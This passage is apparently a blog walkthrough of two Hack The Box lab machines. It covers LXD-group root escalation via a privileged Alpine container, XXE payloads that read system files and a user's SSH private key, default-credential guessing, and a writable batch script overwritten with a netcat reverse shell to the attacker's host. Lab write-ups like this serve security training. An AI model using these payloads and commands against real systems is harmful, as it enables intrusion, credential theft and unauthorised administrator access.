mike@included:/var/www/html$ cat /home/mike/user.txt
cat /home/mike/user.txt
a56ef91d70cfbf2cdb8f454c006*****
mike@included:/var/www/html$
```

*The next step is escalating to the root user in order to gain the highest privileges on the system. Looking at the groups that user Mike is a member of, the ```lxd``` group is listed.*

```
mike@included:/var/www/html$ id
id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

Notes:

**LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.**

**LXC (Linux Containers) is a lightweight virtualization technology designed to run multiple isolated Linux systems (containers) on a single host using a shared kernel. It's often compared to Docker, but LXC offers more of a "system container" approach, meaning it's closer to full virtual machines rather than just isolated application containers.**

*This is exactly what we need and this [HackTricks page](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation) describes the whole exploitation process step by step. The exploit works by making use of the Alpine image, which is a lightweight Linux distribution based on busy box. After this distribution is downloaded and built locally, an HTTP server is used to upload it to the remote system. The image is then imported into LXD and it is used to mount the Host file system with root privileges.*

*Let's begin by installing the Go programming language as well as some other required packages.*

```
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
```

*Then we must clone the LXC Distribution Builder and build it.*

```
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make
```

*After the build is complete let's download the Alpine YAML file and build it.*

```
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxc alpine.yaml -o image.release=3.18
```

*Once the build is done ```lxd.tar.xz``` and ```rootfs.squashfs``` will be available in the same folder.*

Note: on my Kali machine I got the following files: ```alpine.yaml```, ```meta.tar.xz``` ```and rootfs.tar.xz```. It seems like there’s a lot more going on than just a simple a naming difference that’s throwing me off. Typically, ```lxd.tar.xz``` contains metadata like config files, while ```meta.tar.xz``` might be doing the same in this case, just with a different name. However, I couldn't make this method work, so I have decided to try the second one from the Hacktricks article mentioned earlier.

This is how it goes:

```
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```

I executed the build-alpine file and a ```tar.gz``` file was created. In my case I got two files, so I decided to proceed with the first one.

Next, I have launched python web server from the same directory:

```
python3 -m http.server 8000
```

After that I was ready to grab the file from my reverse shell. The usual location of my choice is ```/tmp/``` directory.

```
wget http://10.10.15.4:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

*Now back the article again. The following commands will import the image and create privileged container with it:*

```
lxc image import ./alpine*.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
```

*Next, we need to mount the /root into the image:*

```
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

*Now let's interact with the container:*

```
lxc start mycontainer 
lxc exec mycontainer /bin/sh
```

The ```id``` command confirmed I have attained the root shell and grabbing the root flag was easy:

```
find / -name root.txt 2>/dev/null
```

This example is now concluded.

## External Entities (XXE or XEE) attacks

In 2017, XML External Entities (XXE) attacks ranked fourth on the OWASP Top 10 list for web application vulnerabilities.

But what exactly is XML? XML, or Extensible Markup Language, is a way of structuring data so that both humans and machines can read it. Think of it like HTML, but for data. XML includes something called "entities," which act as placeholders for data. For example, instead of using the characters ```<``` and ```>```, which are reserved for tags, you’d write them as ```&lt;``` and ```&gt;```.

XXE vulnerabilities occur when an XML parser (software that reads XML) is misconfigured, allowing an attacker to insert external entities into the XML input. This can cause the server to load external files or make dangerous requests. For example, an attacker might use XXE to read sensitive files like passwords or even launch attacks on internal systems.

In short, XXE is an injection attack that takes advantage of insecure XML parsers. When the parser doesn't properly sanitize input, attackers can inject malicious XML content (like external entities) to trick the server into exposing files, making unauthorized requests, or even launching further attacks. It's all about manipulating the XML parser to process harmful data.

The Markup box exploits this type of vulnerability through a website that parses user input as XML.

After this intro we are ready to delve into the official HTB write-up:

*Once completed, the nmap scan reports three open ports, 22, 80 and 443. Since we have no credentialsat hand, we can start by exploring the webserver running on port 80. We are met with a simple login page. Attempting a number of default credentials lands us on a successful login.*

```
admin:admin
administrator:administrator
admin:administrator
admin:password
administrator:password
```

*We successfully logged in with "admin:password".*

*Moving past the login screen, we are met with a number of resources. After a quick exploratory dive into each of them, we notice that the "Order" page could be of interest to us, since it presents us with a number of user input fields.*

*In order to better understand how this input functions, we will need to fire up BurpSuite, set up our FoxyProxy plug-in to intercept requests from port 8080, and interact with the input fields by filling in some random information and pressing the "Submit" button.*

Here is intercepted request from my Kali machine:

```
POST /process.php HTTP/1.1
Host: 10.129.95.192
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: text/xml
Content-Length: 115
Origin: http://10.129.95.192
Connection: close
Referer: http://10.129.95.192/services.php
Cookie: PHPSESSID=4e4u7leods2v234uvu1qf0jrj3

<?xml version="1.0"?>
<order>
    <quantity>1</quantity>
    <item>Home Appliances</item>
    <address>Test 123</address>
</order>
```

*Searching for a XML exploitation cheatsheet we are met with several examples such as [the following](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity). From the above cheatsheet an excerpt can be taken that is of relevance to us.*


**Lets try to read ```/etc/passwd``` in different ways. For Windows you could try to read: ```C:\windows\system32\drivers\etc\hosts```. In this first case notice that SYSTEM ```"file:///etc/passwd"``` will also work.**

```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```

*Considering that the target is running a version of Windows, we will be using ```c:/windows/win.ini``` file in order to test out the exploit's validity. In BurpSuite, send the request to the Repeater module by right-clicking on the request and clicking Send to Repeater or by pressing the CTRL + R combination on your keyboard. Then, switch to the Repeater tab at the top of the BurpSuite window and change the XML data section of the request to the following:*

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
<order>
<quantity>
3
</quantity>
<item>
&test;
</item>
<address>
17th Estate, CA
</address>
</order>
```

*You can send the request from the Repeater and receive the server's response with the data pasted below.*

```
HTTP/1.1 200 OK
Date: Thu, 12 Sep 2024 13:57:53 GMT
Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
X-Powered-By: PHP/7.2.28
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 146
Connection: close
Content-Type: text/html; charset=UTF-8

Your order for ; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
[Ports]
COM1:=9600,n,8,1

has been processed
```

*The output of the ```win.ini``` file on the target itself is dispalyed in our response message, which proves that the XML External Entity vulnerability is present.*

*We can try guessing where all the important files are located, however, it might turn out to be an endless road. Let's try to find something of importance on the HTML code of the web page.*

```
 <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Goods & Services</title>
        <!-- Modified by Daniel : UI-Fix-9092-->
        <style>
		(...)
```

*```Modified by Daniel```. This could be a hint towards a username present on the target system, since they would have access to the web page's source code for configuration purposes. Since we can already navigate the files present on the target system using the XXE vulnerability, let's attempt to navigate to the daniel user's ```.ssh``` folder in order to attempt to retrieve their private key.*

Note: we need to modify the following line in our Repeater request like this:

```
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'>]>
```

*The RSA key is printed out in the output, from where it can be placed in a local file on your machine named ```id_rsa```, which you can later use to connect to the target at any point in time. Pick a folder to create the file in and run the commands below.*

```
┌──(lea㉿lea)-[~/Documents]
└─$ touch id_rsa      
                                                                                                                                                                                           
┌──(lea㉿lea)-[~/Documents]
└─$ ls -la id_rsa 
-rw-rw-r-- 1 lea lea 0 Sep 12 16:22 id_rsa
```

*Next, copy the RSA key present in the Response in BurpSuite and paste it into the ```id_rsa``` file using the text editor of your choice. It's also important to set the right privileges for the id_rsa file so as to be accepted by your SSH client.*

```
┌──(lea㉿lea)-[~/Documents]
└─$ chmod 400 id_rsa   
                                                                                                                                                                                            
┌──(lea㉿lea)-[~/Documents]
└─$ ls -la id_rsa 
-r-------- 1 lea lea 2602 Sep 12 16:25 id_rsa
```

*Following this, we can attempt to log in as the daniel user through our SSH client, using his private key.*

```
ssh -i id_rsa daniel@10.129.95.192
```

*We are successful, and the user flag can be retrieved from ```C:\Users\daniel\Desktop``` or by using this simple command:*

```
dir \user.txt /s /p
```

Note: this will search for ```user.txt``` starting from the root directory (```\```) and go through all subdirectories (```/s```), pausing when the screen is full (```/p```).

*In order to retrieve the Administrator flag, we will need to escalate our privileges. Let's check our current ones by typing the command below.*

```
daniel@MARKUP C:\Users\daniel>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

*Seeing as the privileges listed for the daniel user are not of very unique importance, we can move on to exploring the file system in hopes of discovering any uncommon files or folders that we could use to leverage our attack.*

```
daniel@MARKUP C:\>dir 
 Volume in drive C has no label. 
 Volume Serial Number is BA76-B4E3

 Directory of C:\

03/12/2020  03:56 AM    <DIR>          Log-Management
09/15/2018  12:12 AM    <DIR>          PerfLogs
07/28/2021  02:01 AM    <DIR>          Program Files
09/15/2018  12:21 AM    <DIR>          Program Files (x86)
07/28/2021  03:38 AM                 0 Recovery.txt
03/05/2020  05:40 AM    <DIR>          Users
07/28/2021  02:16 AM    <DIR>          Windows
03/05/2020  10:15 AM    <DIR>          xampp
               1 File(s)              0 bytes
               7 Dir(s)   7,373,647,872 bytes free
```

*In the ```C:``` directory, there is a ```Recovery.txt``` file which seems uncommon, but is empty, as seen from the 0 bytes displayed next to the name of the file in our output above. However, the ```Log-Management``` folder might be of some use to us, as it's also uncommon. Inside it, we find a ```job.bat``` file, which upon further inspection offers us some insight into its' purpose.*

```
daniel@MARKUP C:\Log-Management>type job.bat 
@echo off 
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

*The purpose of ```job.bat``` seems to be related to clearing logfiles, and it can only be run with an Administrator account. There is also mention of an executable named ```wevtutil```, which upon [further investigation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil) is determined to be a Windows command that has the ability to retrieve information about event logs and publishers. It can also install and uninstall event manifests, run queries and export, archive and clear logs. We now understand the use of it in this case, alongside the ```el``` and ```cl``` parameters found in the ```job.bat``` file.*

*Since the file itself can only be run by an Administrator, we could try our luck and see if our usergroup could at least edit the file, instead of running it, or if there are any mismatched permissions between the script and the usergroup or file configuration. We can achieve this by using the ```icacls``` command.*

```
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

*Looking at the permissions of ```job.bat``` using ```icacls``` reveals that the group ```BUILTIN\Users``` has full control ```(F)``` over the file. The ```BUILTIN\Users``` group represents all local users, which includes ```Daniel``` as well. We might be able to get a shell by transferring netcat to the system and modifying the script to execute a reverse shell.*

*Before then, we need to check if the ```wevtutil``` process mentioned in the ```job.bat``` file is running. We can see the currently scheduled tasks by typing the ```schtasks``` command. If our permission level doesn't allow us to view this list through Windows' command line, we can quickly use powershell's ```ps``` command instead, which represents another security misconfiguration that works against the server.*

```
daniel@MARKUP C:\Log-Management>powershell -c ps
```

*We can see that the process ```wevtutil``` is running, which is the same process listed in the ```job.bat``` file. This indicates that the ```.bat``` script might be executing.*

*Because the target host does not have access to the Internet, we will need to deliver the ```nc64.exe``` executable through our own connection with the target. In order to do so, we will first need to download ```nc64.exe``` on our system, start up a Python HTTP server on one of our ports, then switch to the shell we have on the host to issue a ```wget``` command with our address and the ```nc64.exe``` file residing on our server. This will initialize a download from the host to our Python server for the executable. Make sure you don't switch folders after downloading the executable. The Python HTTP server needs to be running in the same directory as the location of the downloaded ```nc64.exe``` file we want to deliver to the target. In order to download the executable on our system, we can use this command:*

```
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
python3 -m http.server 80
```

And the next step from the shell we have on the host:

```
PS C:\Log-Management> Invoke-WebRequest http://10.10.15.4/nc64.exe -OutFile nc64.exe
```

Note: the official write-up suggests using the following command: ```wget http://10.10.15.4/nc64.exe --outfile nc64.exe```, however PowerShell's ```wget``` is actually an alias for ```Invoke-WebRequest```, which doesn't recognize ```--outfile```.

*Since we have full control over the ```job.bat``` script, we will modify its' contents by running the appropriate command. Make sure to run it from the Windows Command Line, where the ```daniel@MARKUP``` user is displayed before every command, and not from Windows PowerShell, where ```PS``` is displayed before every command. Here is how to do that:*

```
PS C:\Log-Management> cmd
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Log-Management>
```

*Next, we set up the listener:

```
sudo ncat -lvnp 8000
```

*Now we execute this command on the host:*

```
echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.15.4 8000 > C:\Log-Management\job.bat
```

*Once the script executes, we receive a shell on the terminal tab the listener was active on.*

```
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 10.129.95.192:49683.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
markup\administrator
```

Note: the official write-up states that *the exploit might not work on the first attempt. Due to the sensitivity of the exploit, many attempts might lead to failure, in which case the exploit should be run multiple times until it becomes successful. There is no workaround for an unstable exploit.*

However, I had no problems with the exploit on my first attempt.

Locating the root flag is done with this command:

```
dir \root.txt /s /p
```

This example is now concluded.
